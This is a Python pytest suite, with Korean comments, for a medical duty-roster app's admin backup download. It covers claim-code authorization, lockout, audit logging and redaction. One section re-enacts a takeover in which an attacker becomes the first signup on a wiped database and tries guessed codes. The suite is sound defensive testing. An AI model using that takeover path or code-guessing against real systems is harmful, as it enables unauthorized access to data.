"""관리자용 데이터 백업 내려받기 + 미백업 경고 — 품질부 검증 (T3).

**설계 출발점은 지시서의 수용 기준이다**
(`docs/orders/2026-08-20-백업-내려받기.md` 본문 1~7 + 보완 지시, 그리고 그 뒤
운영자 결정 **D-19**(권한 코드 방식)·**D-20**(복구 시 운영자 직접 업로드)로 갱신된
기준). 구현(app/backup.py)을 읽고 역산하지 않았다 — 엔드포인트 경로·요청 본문·
헤더 이름 같은 **계약**만 확인했고 기대값은 전부 기준에서 왔다.

이번 판(3차)에서 바뀐 것
- 권한은 **환경변수 uid 목록이 아니라 `users.backup_owner` 플래그**다. 플래그는
  운영자만 아는 **권한 코드**(`DUTY_BACKUP_CLAIM_CODE`)를 `POST /backup/claim`으로
  제출한 계정에만 켜진다. `DUTY_BACKUP_OWNER_UID`·`DUTY_BACKUP_OWNER`는 **설정해도
  아무 효과가 없어야 한다**(이 파일이 그것까지 검증한다).
- 이력은 pending → (사람이 저장을 눈으로 확인) → confirm 의 **3단계**이고,
  level 판정은 `ok` 행만 센다(`pending`·`fail`·`denied`·`archived` 제외).
- 백업본(스냅샷)의 `ok` 이력은 `archived`로 치환된다 — **복구본은 언제나 critical**.

규정 준수
- 등장하는 이름·이메일·사번은 전부 **가명/가짜 값**이다(교훈 L-1). 사번은 실제와
  겹치지 않도록 `99`로 시작하는 값만 쓴다.
- 날짜는 전부 KST 상대 계산으로 만든다(하드코딩 금지, 교훈 L-4).
- **권한 코드 실값은 저장소에 없다.** 테스트마다 `secrets`로 새로 만들어 환경변수로
  주입한다.

실행:  python -m pytest tests/test_backup.py -q
"""
from __future__ import annotations

import ast
import csv
import inspect
import io
import json
import os
import re
import secrets
import sqlite3
import tempfile
import threading
import time
import zipfile
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

KST = timezone(timedelta(hours=9))

BACKUP_URL = "/api/admin/backup"
CONFIRM_URL = "/api/admin/backup/confirm"
CLAIM_URL = "/api/admin/backup/claim"
REVOKE_URL = "/api/admin/backup/revoke"
STATUS_URL = "/api/admin/backup/status"

CLAIM_ENV = "DUTY_BACKUP_CLAIM_CODE"
# 제거된 옛 권한 경로 — 설정해도 무효여야 한다(D-19).
LEGACY_UID_ENV = "DUTY_BACKUP_OWNER_UID"
LEGACY_STR_ENV = "DUTY_BACKUP_OWNER"

# 지시서 "산출물 구성": CSV는 7개 = 앱 테이블 전량에서 backup_log 제외
# (backup_log는 복구 정본 duty.db 안에 들어 있으므로 손실 없음).
EXPECTED_CSV_TABLES = {
    "users", "ward_invites", "rosters", "schedules",
    "wanted_requests", "request_windows", "feedback",
}
BOM = b"\xef\xbb\xbf"

# 명시적으로 가려져야 하는 자격증명 (테이블, 컬럼)
CREDENTIAL_COLUMNS = [("users", "pw_hash"), ("users", "salt"), ("ward_invites", "code")]
# 컬럼명 휴리스틱(fail-closed)이 잡아야 하는 **새로 추가된** 컬럼들
NEW_SECRET_COLUMNS = ["reset_token", "api_key", "totp_secret", "recovery_code"]


# ============================ 픽스처 / 헬퍼 ============================

@pytest.fixture()
def env(tmp_path, monkeypatch):
    """DB·임시 디렉터리를 테스트마다 격리하고, 권한 관련 환경변수를 모두 지운다."""
    db_dir = tmp_path / "dbdir"
    db_dir.mkdir()
    tmp_dir = tmp_path / "srvtmp"
    tmp_dir.mkdir()
    monkeypatch.setenv("DUTY_DB", str(db_dir / "test.db"))
    monkeypatch.setenv("DUTY_SECRET", "test-secret-for-qa-suite-0003")
    for name in (CLAIM_ENV, LEGACY_UID_ENV, LEGACY_STR_ENV):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("TMPDIR", str(tmp_dir))
    monkeypatch.setattr(tempfile, "tempdir", str(tmp_dir), raising=False)
    # 잠금 카운터·해제시각은 이제 **계정 행(users.claim_fails·claim_locked_until)에
    # DB로 영속**한다(Q-3). DUTY_DB가 테스트마다 새 파일이라 잠금 상태도 함께
    # 격리되므로, 예전의 프로세스 전역 카운터(backup._claim_fails) 초기화는 필요
    # 없다 — 그 메모리 카운터 자체가 구현에서 제거됐다(이 fixture가 그것을 참조하다
    # 전 백업 테스트가 setup 단계에서 죽던 [인프라] 결함을 여기서 해소한다).
    yield SimpleNamespace(db_dir=db_dir, tmp_dir=tmp_dir)


@pytest.fixture()
def client(env):
    from app.main import app

    return TestClient(app)


def _new_claim_code(length: int = 24) -> str:
    """테스트용 권한 코드를 **매번 새로** 만든다 — 저장소에 실값을 남기지 않는다."""
    raw = secrets.token_urlsafe(length * 2).replace("-", "x").replace("_", "y")
    return raw[:length]


@pytest.fixture()
def code(env, monkeypatch) -> str:
    """유효한(충분히 긴) 권한 코드가 설정된 상태."""
    value = _new_claim_code()
    monkeypatch.setenv(CLAIM_ENV, value)
    return value


def _h(tok):
    return {"Authorization": f"Bearer {tok}"}


def _db():
    conn = sqlite3.connect(os.environ["DUTY_DB"], timeout=10)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA busy_timeout=10000")
    return conn


def _invite_code(ward):
    conn = _db()
    try:
        row = conn.execute("SELECT code FROM ward_invites WHERE ward=?", (ward,)).fetchone()
        return row[0] if row else None
    finally:
        conn.close()


def _reg(client, *, email=None, empno=None, name="사용자", pw="password123", ward="61"):
    """가입 헬퍼: 병동 미개설이면 개설(master), 이미 있으면 초대 코드로 가입(staff)."""
    body = {"password": pw, "name": name}
    if email:
        body["email"] = email
    if empno:
        body["empno"] = empno
    r = client.post("/api/auth/register", json={**body, "ward": ward})
    if r.status_code == 403:  # 병동 기개설 → 초대 코드로 가입
        r = client.post("/api/auth/register", json={**body, "invite_code": _invite_code(ward)})
    assert r.status_code == 200, r.text
    out = r.json()
    out["_pw"] = pw
    return out


def _login(client, login_id, pw="password123"):
    r = client.post("/api/auth/login", json={"login": login_id, "password": pw})
    assert r.status_code == 200, r.text
    return r.json()


def _set_role(client, master, *, email, role):
    r = client.post("/api/auth/set-role", json={"email": email, "role": role},
                    headers=_h(master["token"]))
    assert r.status_code == 200 and r.json()["role"] == role, r.text


def _uid_of(user) -> int:
    """이 계정의 users.id — 응답에는 더 이상 없으므로(D-19) DB에서 읽는다."""
    conn = _db()
    try:
        row = conn.execute("SELECT id FROM users WHERE name=? AND ward=?",
                           (user["name"], user["ward"])).fetchone()
    finally:
        conn.close()
    assert row is not None, f"계정을 찾지 못함: {user['name']}/{user['ward']}"
    return int(row[0])


def _flag_of(user) -> int:
    conn = _db()
    try:
        row = conn.execute("SELECT backup_owner FROM users WHERE id=?",
                           (_uid_of(user),)).fetchone()
    finally:
        conn.close()
    return int(row[0])


# ---- 등장인물(전원 가명 · 가짜 사번) ----
OWNER = SimpleNamespace(email="seoyeon@duty.kr", name="김서연", empno="990001", ward="61")
ADMIN = SimpleNamespace(email="jiwoo@duty.kr", name="이지우", empno="990002", ward="61")
STAFF = SimpleNamespace(email="minjun@duty.kr", name="최민준", empno="990003", ward="61")
OTHER = SimpleNamespace(email="haneul@duty.kr", name="박하늘", empno="990004", ward="99")


@pytest.fixture()
def people(client):
    """61병동 master(권한 후보)·admin·staff + 99병동의 다른 master."""
    owner = _reg(client, email=OWNER.email, empno=OWNER.empno, name=OWNER.name, ward=OWNER.ward)
    assert owner["role"] == "master"
    admin = _reg(client, email=ADMIN.email, empno=ADMIN.empno, name=ADMIN.name, ward=ADMIN.ward)
    staff = _reg(client, email=STAFF.email, empno=STAFF.empno, name=STAFF.name, ward=STAFF.ward)
    _set_role(client, owner, email=ADMIN.email, role="admin")
    other = _reg(client, email=OTHER.email, empno=OTHER.empno, name=OTHER.name, ward=OTHER.ward)
    assert other["role"] == "master", "99병동 개설자는 그 병동의 master여야 함"
    # storage 스키마(backup_log 포함)를 만들어 둔다.
    assert client.get("/api/roster", headers=_h(owner["token"])).status_code == 200
    return SimpleNamespace(owner=owner, admin=admin, staff=staff, other=other)


def _claim(client, user, value):
    return client.post(CLAIM_URL, json={"code": value}, headers=_h(user["token"]))


def _grant(client, user, value):
    """권한 코드로 이 계정에 백업 권한을 등록한다(성공을 단언)."""
    r = _claim(client, user, value)
    assert r.status_code == 200, f"권한 등록 실패: {r.status_code} {r.text[:300]}"
    assert _flag_of(user) == 1, "등록했는데 users.backup_owner 플래그가 켜지지 않음"
    return r


@pytest.fixture()
def owner_ok(client, people, code):
    """권한 코드를 등록해 백업 권한을 가진 61병동 master."""
    _grant(client, people.owner, code)
    return people.owner


def _log_rows():
    conn = _db()
    try:
        names = {r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type='table'")}
        assert "backup_log" in names, f"backup_log 테이블 없음: {sorted(names)}"
        return [dict(r) for r in conn.execute("SELECT * FROM backup_log ORDER BY id")]
    finally:
        conn.close()


def _rows_with(status):
    return [r for r in _log_rows() if r["status"] == status]


def _zip_of(resp) -> zipfile.ZipFile:
    assert resp.status_code == 200, f"{resp.status_code} {resp.text[:400]}"
    body = resp.content
    assert body[:2] == b"PK", f"ZIP 시그니처 아님: {body[:8]!r}"
    return zipfile.ZipFile(io.BytesIO(body))


def _csv_names(zf) -> set[str]:
    return {n.split("/", 1)[1][: -len(".csv")] for n in zf.namelist()
            if n.startswith("tables/") and n.endswith(".csv")}


def _csv_rows(zf, table):
    raw = zf.read(f"tables/{table}.csv")
    assert raw[:3] == BOM, f"{table}.csv 가 UTF-8 BOM으로 시작하지 않음: {raw[:6]!r}"
    text = raw.decode("utf-8-sig")
    return list(csv.DictReader(io.StringIO(text)))


def _extract_db(zf, dest, name="restored.db") -> str:
    path = os.path.join(str(dest), name)
    with open(path, "wb") as f:
        f.write(zf.read("duty.db"))
    return path


def _feedback(client, user, message):
    r = client.post("/api/feedback", json={"message": message}, headers=_h(user["token"]))
    assert r.status_code == 200, r.text
    return r


def _download(client, user):
    """GET /backup — 응답과 pending 행 번호(X-Backup-Id)를 함께 돌려준다."""
    r = client.get(BACKUP_URL, headers=_h(user["token"]))
    assert r.status_code == 200, f"{r.status_code} {r.text[:400]}"
    raw = r.headers.get("x-backup-id")
    assert raw and raw.isdigit(), f"X-Backup-Id 헤더가 없거나 숫자가 아님: {raw!r}"
    return r, int(raw)


def _confirm(client, user, backup_id, size):
    return client.post(CONFIRM_URL, json={"id": backup_id, "bytes": size},
                       headers=_h(user["token"]))


def _full_backup(client, user):
    """기준이 정의한 '성공한 백업' 1회 = 내려받기 + 사람 확인 후 확정(confirm)."""
    r, bid = _download(client, user)
    ok = _confirm(client, user, bid, len(r.content))
    assert ok.status_code == 200, f"confirm 실패: {ok.status_code} {ok.text[:300]}"
    return r, bid


def _files_under(root) -> set[str]:
    out = set()
    for dirpath, _dirnames, filenames in os.walk(str(root)):
        for f in filenames:
            out.add(os.path.join(dirpath, f))
    return out


def _assert_no_leftovers(env, before_tmp, before_db, *, where=""):
    leftover_tmp = _files_under(env.tmp_dir) - before_tmp
    assert not leftover_tmp, f"임시 디렉터리에 백업 잔여물{where}: {sorted(leftover_tmp)}"
    allowed = {os.environ["DUTY_DB"] + suffix for suffix in ("", "-wal", "-shm", "-journal")}
    leftover_db = {p for p in _files_under(env.db_dir) - before_db if p not in allowed}
    assert not leftover_db, f"DB 디렉터리에 백업 잔여물{where}: {sorted(leftover_db)}"


# ---- KST 상대 시각 ----

def _kst_days_ago(n: int, *, flip_utc_date: bool = False) -> datetime:
    """지금으로부터 **KST 달력 기준** 정확히 n일 전인 시각."""
    now_kst = datetime.now(timezone.utc).astimezone(KST)
    d = (now_kst - timedelta(days=n)).date()
    if flip_utc_date:
        hour = 12 if now_kst.hour < 9 else 3
    else:
        hour = 12
    return datetime(d.year, d.month, d.day, hour, 0, tzinfo=KST)


def _utc_date_diff(dt: datetime) -> int:
    now_utc = datetime.now(timezone.utc)
    return (now_utc.date() - dt.astimezone(timezone.utc).date()).days


def _insert_log_row(dt: datetime, *, status: str = "ok", uid: int = 1, size: int = 4096):
    conn = _db()
    try:
        conn.execute(
            "INSERT INTO backup_log (actor, ward, created_at, byte_size, status) "
            "VALUES (?,?,?,?,?)",
            (f"uid:{uid}", OWNER.ward, dt.astimezone(timezone.utc).isoformat(), size, status))
        conn.commit()
    finally:
        conn.close()


def _set_last_backup(dt, *, status: str = "ok"):
    """backup_log를 '마지막 성공 시각' 하나만 남긴 상태로 만든다(저장은 UTC ISO)."""
    conn = _db()
    try:
        conn.execute("DELETE FROM backup_log")
        conn.commit()
    finally:
        conn.close()
    if dt is not None:
        _insert_log_row(dt, status=status)


def _status(client, user):
    r = client.get(STATUS_URL, headers=_h(user["token"]))
    assert r.status_code == 200, f"{r.status_code} {r.text[:300]}"
    body = r.json()
    for key in ("last_backup_at", "days_since", "level", "denied_last_30d"):
        assert key in body, f"상태 응답에 {key} 없음: {body}"
    return body


# ==================== G. 권한 — 권한 코드(claim) fail-closed ====================
#
# 폐기된 기준(uid 환경변수 allowlist)의 자리를 대신한다. 옛 기준의
# test_ac1_uid_env_is_fail_closed[*] 9건 · test_ac1_legacy_string_env_has_no_effect ·
# test_ac1_uid_allowlist_comma_list_and_whitespace 는 기준 자체가 사라졌으므로
# 아래 "코드 fail-closed" 묶음으로 대체했다.

def test_claim_disabled_when_code_unset(client, people):
    """권한 코드 **미설정** → 등록 기능 자체가 꺼진다(전원 거부)."""
    r = _claim(client, people.owner, "anything-at-all-1234")
    assert r.status_code == 403, f"코드 미설정인데 {r.status_code}: {r.text[:200]}"
    assert _flag_of(people.owner) == 0, "코드가 없는데 권한 플래그가 켜졌다"
    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 403


@pytest.mark.parametrize("value", ["", "   ", "\t\n"])
def test_claim_disabled_when_code_blank(client, people, monkeypatch, value):
    """빈 값·공백만 있는 코드 → 비활성. 그 공백 문자열을 그대로 제출해도 거부."""
    monkeypatch.setenv(CLAIM_ENV, value)
    for attempt in (value, value.strip(), "x"):
        r = _claim(client, people.owner, attempt)
        assert r.status_code == 403, f"빈 코드({value!r})에 {attempt!r} → {r.status_code}"
    assert _flag_of(people.owner) == 0


@pytest.mark.parametrize("length", [1, 4, 7])
def test_claim_disabled_for_short_code(client, people, monkeypatch, length):
    """**8자 미만**이면 정답을 그대로 넣어도 거부 — 약한 코드로 문이 열리면 안 된다."""
    weak = _new_claim_code(length)
    assert len(weak) == length
    monkeypatch.setenv(CLAIM_ENV, weak)
    r = _claim(client, people.owner, weak)
    assert r.status_code == 403, f"{length}자 코드로 등록이 됐다: {r.status_code} {r.text[:200]}"
    assert _flag_of(people.owner) == 0, f"{length}자 코드로 권한 플래그가 켜졌다"
    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 403


def test_claim_enabled_at_eight_chars(client, people, monkeypatch):
    """경계: **정확히 8자**면 등록이 동작한다(그 아래는 위 테스트에서 전원 거부)."""
    exact = _new_claim_code(8)
    assert len(exact) == 8
    monkeypatch.setenv(CLAIM_ENV, exact)
    _grant(client, people.owner, exact)
    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 200


def test_claim_wrong_code_is_denied(client, people, code):
    """코드가 설정돼 있어도 **틀린 코드**는 거부되고 플래그도 켜지지 않는다."""
    r = _claim(client, people.owner, _new_claim_code())
    assert r.status_code == 403, f"틀린 코드인데 {r.status_code}"
    assert _flag_of(people.owner) == 0
    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 403


@pytest.mark.parametrize("kind", ["prefix", "suffix_cut", "one_char_off", "case_flip"])
def test_claim_near_miss_codes_are_denied(client, people, code, kind):
    """거의 맞는 코드(앞자리 일치·한 글자 차이·대소문자 변형)도 전부 거부."""
    if kind == "prefix":
        attempt = code[: len(code) // 2]
    elif kind == "suffix_cut":
        attempt = code[:-1]
    elif kind == "one_char_off":
        last = "z" if code[-1] != "z" else "q"
        attempt = code[:-1] + last
    else:
        attempt = code.swapcase()
        if attempt == code:  # 알파벳이 없으면 다른 변형으로
            attempt = code + "A"
    assert attempt != code, "테스트 자기검증 실패: 정답과 같은 값을 제출했다"
    r = _claim(client, people.owner, attempt)
    assert r.status_code == 403, f"{kind}({attempt!r})가 통과했다: {r.status_code}"
    assert _flag_of(people.owner) == 0


def test_claim_uses_constant_time_comparison(client):
    """코드 비교는 **상수 시간**(hmac.compare_digest)이어야 한다.

    실행 시간을 재는 통계적 테스트는 컨테이너에서 불안정(플레이크)해 게이트로
    쓸 수 없다. 대신 "무엇으로 비교하는가"를 코드 계약으로 고정한다 —
    `==` 비교로 되돌리면 이 테스트가 깨진다.
    """
    import app.backup as backup

    src = inspect.getsource(backup.claim_backup_owner)
    # 주석에 적힌 이름에 속지 않도록 **구문 트리**로 본다(주석만 남기고 비교를
    # ==/!= 로 바꾸는 회귀를 실제로 겪었다).
    tree = ast.parse(src)
    calls = [n for n in ast.walk(tree) if isinstance(n, ast.Call)
             and getattr(n.func, "attr", getattr(n.func, "id", "")) == "compare_digest"]
    assert calls, ("claim 경로가 상수 시간 비교(hmac.compare_digest)를 쓰지 않는다:\n" + src)
    for node in ast.walk(tree):
        if not isinstance(node, ast.Compare):
            continue
        names = {getattr(x, "attr", getattr(x, "id", ""))
                 for x in [node.left, *node.comparators]}
        assert "code" not in names, (
            "claim 경로가 코드를 직접 비교한다(==/!=) — 타이밍으로 앞자리가 샌다:\n"
            + ast.dump(node))


def test_claim_grants_flag_and_opens_backup(client, people, code):
    """정답 코드 제출 → `users.backup_owner` 플래그 ON → 200 + ZIP."""
    before = client.get(BACKUP_URL, headers=_h(people.owner["token"]))
    assert before.status_code == 403, "등록 전에 이미 열려 있다"
    _grant(client, people.owner, code)
    r = client.get(BACKUP_URL, headers=_h(people.owner["token"]))
    assert r.status_code == 200, f"{r.status_code} {r.text[:300]}"
    assert r.content[:2] == b"PK", "본문이 ZIP이 아님"
    assert ".zip" in r.headers.get("content-disposition", "").lower()


def test_claim_is_repeatable_for_same_account(client, people, code):
    """이미 권한이 있는 계정이 다시 등록해도 200(멱등) — 플래그는 그대로 1."""
    _grant(client, people.owner, code)
    again = _claim(client, people.owner, code)
    assert again.status_code == 200, f"재등록이 {again.status_code}"
    assert _flag_of(people.owner) == 1


def test_permission_survives_relogin_and_code_removal(client, people, code, monkeypatch):
    """권한은 **계정에 붙는다** — 재로그인해도, 코드를 환경에서 지워도 유지된다.

    (배포 문서가 "등록 뒤 코드는 지워도 된다"고 안내하는 근거.)
    """
    _grant(client, people.owner, code)
    monkeypatch.delenv(CLAIM_ENV, raising=False)
    fresh = _login(client, OWNER.empno)
    r = client.get(BACKUP_URL, headers=_h(fresh["token"]))
    assert r.status_code == 200, f"재로그인 후 {r.status_code} — 권한이 계정에 붙어 있지 않다"


@pytest.mark.parametrize("who", ["staff", "admin"])
def test_non_master_cannot_claim_even_with_correct_code(client, people, code, who):
    """staff·admin은 **정답 코드를 알아도** 등록 불가(role==master 결합 조건)."""
    user = getattr(people, who)
    r = _claim(client, user, code)
    assert r.status_code == 403, f"{who}가 정답 코드로 등록에 성공했다: {r.status_code}"
    assert _flag_of(user) == 0, f"{who}의 권한 플래그가 켜졌다"
    assert client.get(BACKUP_URL, headers=_h(user["token"])).status_code == 403


def test_flagged_account_loses_access_when_demoted(client, people, code):
    """플래그가 있어도 role이 master가 아니면 거부 — 강등된 계정은 권한을 못 쓴다."""
    _grant(client, people.owner, code)
    conn = _db()
    try:  # 강등(운영자가 역할을 바꾼 상황)
        conn.execute("UPDATE users SET role='admin' WHERE id=?", (_uid_of(people.owner),))
        conn.commit()
    finally:
        conn.close()
    fresh = _login(client, OWNER.empno)
    assert fresh["role"] == "admin"
    r = client.get(BACKUP_URL, headers=_h(fresh["token"]))
    assert r.status_code == 403, f"강등됐는데 {r.status_code}"


def test_master_without_flag_is_denied(client, people, code):
    """다른 병동 master(코드 미등록)는 403 — 역할만으로는 절대 열리지 않는다."""
    _grant(client, people.owner, code)
    r = client.get(BACKUP_URL, headers=_h(people.other["token"]))
    assert r.status_code == 403, f"미등록 master에게 {r.status_code}"
    assert r.content[:2] != b"PK"


@pytest.mark.parametrize("url,method", [
    (BACKUP_URL, "GET"), (STATUS_URL, "GET"), (CLAIM_URL, "POST"),
    (REVOKE_URL, "POST"), (CONFIRM_URL, "POST")])
def test_unauthenticated_is_401(client, people, code, url, method):
    """무인증은 전 경로 401(권한 이전에 인증) — 회수(revoke) 경로도 포함."""
    if method == "GET":
        r = client.get(url)
    else:
        body = {"code": code} if url in (CLAIM_URL, REVOKE_URL) else {"id": 1, "bytes": 1}
        r = client.post(url, json=body)
    assert r.status_code == 401, f"{method} {url} → {r.status_code}"
    for bad in ({"Authorization": "Bearer not-a-token"}, {"Authorization": "Basic x"}):
        rr = client.get(url, headers=bad) if method == "GET" else client.post(
            url, json={"code": "x"}, headers=bad)
        assert rr.status_code == 401, f"위조 토큰 {bad} → {rr.status_code}"


def test_denial_body_carries_no_personal_info(client, people, code):
    """거부 응답 본문에 실명·사번·이메일이 없다(교훈 L-1)."""
    _grant(client, people.owner, code)
    leaks = [OWNER.name, OWNER.empno, OWNER.email, ADMIN.name, ADMIN.empno,
             STAFF.name, STAFF.empno, STAFF.email]
    for user in (people.staff, people.admin, people.other):
        for r in (client.get(BACKUP_URL, headers=_h(user["token"])),
                  client.get(STATUS_URL, headers=_h(user["token"])),
                  _claim(client, user, _new_claim_code())):
            assert r.status_code in (403, 429), r.status_code
            body = r.text
            for leak in leaks:
                assert leak not in body, f"거부 응답에 개인정보 노출: {leak} in {body[:200]}"


def test_status_endpoint_is_owner_only(client, people, code):
    """/backup/status 도 허가 계정 전용(경고 상태는 권한 정보다)."""
    for user in (people.staff, people.admin, people.other, people.owner):
        assert client.get(STATUS_URL, headers=_h(user["token"])).status_code == 403
    _grant(client, people.owner, code)
    assert client.get(STATUS_URL, headers=_h(people.owner["token"])).status_code == 200


def test_no_store_on_every_backup_endpoint(client, people, code):
    """전체 DB 사본·경고 상태가 브라우저 캐시에 남지 않는다(보완 지시 필수 4-1)."""
    claim_resp = _grant(client, people.owner, code)
    r, bid = _download(client, people.owner)
    conf = _confirm(client, people.owner, bid, len(r.content))
    stat = client.get(STATUS_URL, headers=_h(people.owner["token"]))
    for name, resp in (("claim", claim_resp), ("backup", r),
                       ("confirm", conf), ("status", stat)):
        assert "no-store" in resp.headers.get("cache-control", "").lower(), \
            f"{name} 응답에 Cache-Control: no-store 없음: {dict(resp.headers)}"


# ==================== G-2. 실패 잠금 (5회 → 15분 429) ====================

def test_lock_after_five_failures(client, people, code):
    """정답을 모른 채 5회 실패하면 6번째부터 429."""
    import app.backup as backup

    assert backup.CLAIM_MAX_FAILS == 5, f"실패 허용 횟수가 기준과 다름: {backup.CLAIM_MAX_FAILS}"
    assert backup.CLAIM_LOCK_SEC == 15 * 60, f"잠금 시간이 기준(15분)과 다름: {backup.CLAIM_LOCK_SEC}"
    for i in range(5):
        r = _claim(client, people.owner, _new_claim_code())
        assert r.status_code == 403, f"{i + 1}번째 실패가 403이 아님: {r.status_code}"
    r = _claim(client, people.owner, _new_claim_code())
    assert r.status_code == 429, f"6번째 시도가 잠기지 않음: {r.status_code} {r.text[:200]}"


def test_lock_beats_the_correct_code(client, people, code):
    """**잠긴 상태에서는 정답 코드도 429** — 잠금이 정답보다 우선한다."""
    for _ in range(5):
        assert _claim(client, people.owner, _new_claim_code()).status_code == 403
    r = _claim(client, people.owner, code)
    assert r.status_code == 429, f"잠금 중 정답이 통과했다: {r.status_code} {r.text[:200]}"
    assert _flag_of(people.owner) == 0, "잠금 중인데 권한 플래그가 켜졌다"
    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 403


def test_lock_expires_after_window(client, people, code, monkeypatch):
    """잠금 시간이 지나면 풀린다 — 영구 잠금이 아니다.

    실제 15분을 기다리지 않으려고 잠금 길이만 0초로 바꿔 만료 후 동작을 본다
    (기본값이 15분인 것은 위 테스트가 상수로 고정한다).
    """
    import app.backup as backup

    monkeypatch.setattr(backup, "CLAIM_LOCK_SEC", 0)
    for _ in range(5):
        assert _claim(client, people.owner, _new_claim_code()).status_code == 403
    _grant(client, people.owner, code)


def test_lock_survives_process_restart(client, people, code):
    """**기준 반전(Q-3)**: 잠금은 이제 프로세스 메모리가 아니라 **계정 행에 DB로
    영속**한다. 재시작해도 카운터가 살아남아 잠금이 유지된다.

    (직전 판의 test_lock_counter_is_lost_on_process_restart는 "메모리라 재시작하면
    풀린다"를 고정했는데 Q-3로 기준이 뒤집혔다. 폐기하고 이 이름으로 재작성한다.)

    판별력의 핵심은 **DB(users 행)에 실제로 적혔는지 직접 확인**하는 것이다 —
    잠금을 프로세스 메모리로 되돌리면 이 컬럼들이 비어 이 단언이 깨진다. 새 앱
    인스턴스(같은 DUTY_DB)로 만든 클라이언트가 여전히 429를 받는 것으로 동작을 확인한다.
    """
    import app.backup as backup

    for _ in range(5):
        assert _claim(client, people.owner, _new_claim_code()).status_code == 403
    assert _claim(client, people.owner, code).status_code == 429, "5회 실패 후 잠기지 않음"

    # 잠금 상태가 실제로 **DB(users 행)** 에 적혔는지 직접 본다(영속의 근거).
    uid = _uid_of(people.owner)
    conn = _db()
    try:
        row = conn.execute(
            "SELECT claim_fails, claim_locked_until FROM users WHERE id=?", (uid,)
        ).fetchone()
    finally:
        conn.close()
    assert row is not None and int(row["claim_fails"]) >= backup.CLAIM_MAX_FAILS, \
        f"실패 횟수가 DB에 영속되지 않음: {dict(row) if row else None}"
    assert row["claim_locked_until"], "잠금 해제 시각이 DB에 영속되지 않음"

    # 프로세스 재시작 모사: 같은 DUTY_DB를 읽는 새 클라이언트를 띄운다.
    from app.main import app as fresh_app
    fresh_client = TestClient(fresh_app)
    r = fresh_client.post(CLAIM_URL, json={"code": code},
                          headers=_h(people.owner["token"]))
    assert r.status_code == 429, (
        f"재시작 후 잠금이 풀렸다 — 카운터가 영속되지 않는다: {r.status_code} {r.text[:200]}")
    assert _flag_of(people.owner) == 0, "재시작 후 잠금 중인데 권한이 켜졌다"


def test_failed_claims_are_logged_as_denied_once_per_day(client, people, code):
    """실패는 `denied`로 남되 **uid별 하루 1행**으로 합쳐진다."""
    for _ in range(4):
        assert _claim(client, people.owner, _new_claim_code()).status_code == 403
    rows = _rows_with("denied")
    actor = f"uid:{_uid_of(people.owner)}"
    mine = [r for r in rows if r["actor"] == actor]
    assert len(mine) == 1, f"실패 4회가 {len(mine)}행으로 남음(1행이어야 함): {rows}"
    assert mine[0]["byte_size"] == 0
    for leak in (OWNER.name, OWNER.empno, OWNER.email):
        assert leak not in json.dumps(mine[0], ensure_ascii=False), \
            f"거부 이력에 개인정보: {leak}"


def test_denied_rows_are_separate_per_account(client, people, code):
    """계정이 다르면 거부 이력도 따로 남는다(누가 두드렸는지 구분 가능)."""
    _claim(client, people.owner, _new_claim_code())
    _claim(client, people.other, _new_claim_code())
    client.get(BACKUP_URL, headers=_h(people.staff["token"]))
    actors = {r["actor"] for r in _rows_with("denied")}
    expected = {f"uid:{_uid_of(u)}" for u in (people.owner, people.other, people.staff)}
    assert expected <= actors, f"거부 이력이 계정별로 남지 않음: {actors} vs {expected}"


def test_lock_is_per_account_not_ip(client, people, code):
    """**기준 반전(Q-3)**: 잠금은 **계정 단위**로만 건다. IP 축을 제거했다.

    계정 A(owner)가 5회 실패해 잠겨도, 같은 출처(TestClient는 전 요청이 같은
    클라이언트=같은 IP)에서 계정 B(other, 다른 병동 master)는 **정답 코드로 즉시
    등록에 성공**한다. 프록시 뒤 공용 IP에서 정상 운영자가 남의 오입력에 잠기지 않게
    하려는 전환이다(직전 판의 test_lock_also_applies_to_the_same_source_ip를 폐기·재작성).
    """
    for _ in range(5):
        assert _claim(client, people.owner, _new_claim_code()).status_code == 403
    assert _claim(client, people.owner, code).status_code == 429, "계정 A가 잠기지 않았다"

    # 같은 클라이언트(=같은 IP)의 다른 계정 B는 A의 잠금에 영향받지 않는다.
    r = _claim(client, people.other, code)
    assert r.status_code == 200, (
        f"계정 B가 A의 잠금에 휩쓸렸다(IP 축이 남아 있는가?): {r.status_code} {r.text[:200]}")
    assert _flag_of(people.other) == 1, "잠기지 않은 계정 B의 등록이 반영되지 않았다"
    # A는 여전히 잠긴 채다(격리 확인).
    assert _claim(client, people.owner, code).status_code == 429, "A의 잠금이 B 등록으로 풀렸다"


# ==================== G-3. 침투 재현 (품질부가 직접 수행) ====================

def test_pen_first_signup_on_empty_db_cannot_export(client, env, monkeypatch):
    """**최우선**: 빈 DB에서 공격자가 첫 가입자(uid 1, master)가 되어도 백업 403.

    직전 라운드에서 실제로 뚫린 경로다 — 볼륨을 잃어 DB가 초기화되면 첫 가입자가
    uid 1을 물려받아 환경변수에 적힌 권한을 **상속**했다. 권한이 계정 플래그로
    옮겨간 뒤에는 초기화와 함께 플래그도 사라져야 하고, 코드를 모르면 되살릴 수 없다.
    """
    # 운영자는 코드를 설정해 둔 상태(공격자는 그 값을 모른다).
    real_code = _new_claim_code()
    monkeypatch.setenv(CLAIM_ENV, real_code)

    attacker = _reg(client, email="attacker@duty.kr", empno="998001",
                    name="가명공격자", ward="61")
    assert attacker["role"] == "master", "첫 가입자는 그 병동의 master가 된다(전제)"
    assert _uid_of(attacker) == 1, "빈 DB의 첫 가입자는 uid 1이어야 한다(전제 확인)"

    r = client.get(BACKUP_URL, headers=_h(attacker["token"]))
    assert r.status_code == 403, f"uid 1 master가 백업을 가져갔다: {r.status_code}"
    assert r.content[:2] != b"PK"
    assert _flag_of(attacker) == 0

    # 코드를 모르면 스스로 권한을 켤 수도 없다.
    for guess in ("password", "duty2026", "backup-code", "00000000", real_code[:-1]):
        assert _claim(client, attacker, guess).status_code in (403, 429), \
            f"추측 코드 {guess!r}로 권한이 켜졌다"
    assert _flag_of(attacker) == 0
    assert client.get(BACKUP_URL, headers=_h(attacker["token"])).status_code == 403


